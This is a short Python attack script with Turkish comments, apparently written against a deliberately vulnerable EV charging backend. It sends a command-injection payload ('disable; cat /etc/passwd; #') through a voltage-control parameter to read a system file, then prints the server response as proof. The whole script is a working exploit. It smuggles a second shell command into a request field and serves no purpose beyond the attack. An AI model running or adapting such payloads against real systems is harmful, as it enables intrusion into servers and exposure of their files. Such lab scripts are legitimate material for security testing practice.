import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("📂 DOSYA OKUMA SALDIRISI (CORRECTED)\n")

# Hassas dosyayı okumaya çalış
payload = {
    "voltage_value": "400",
    "dump_load_cmd": "disable; cat /etc/passwd; #"
}

try:
    r = requests.post(f"{BACKEND}/vulnerable/set-voltage", params=payload)
    result = r.json()

    print(f"Server Response: {result}")

    if "Command Injection detected" in str(result):
        print("✅ Dosya okuma komutu gönderildi!")
        print("📄 Sunucu: 'passwd dosyasını okuyorum...'")
        print("\n[KANIT]")
        print(result)
    else:
        print("❌ Saldırı başarısız:")
        print(result)
except Exception as e:
    print(f"Error: {e}")
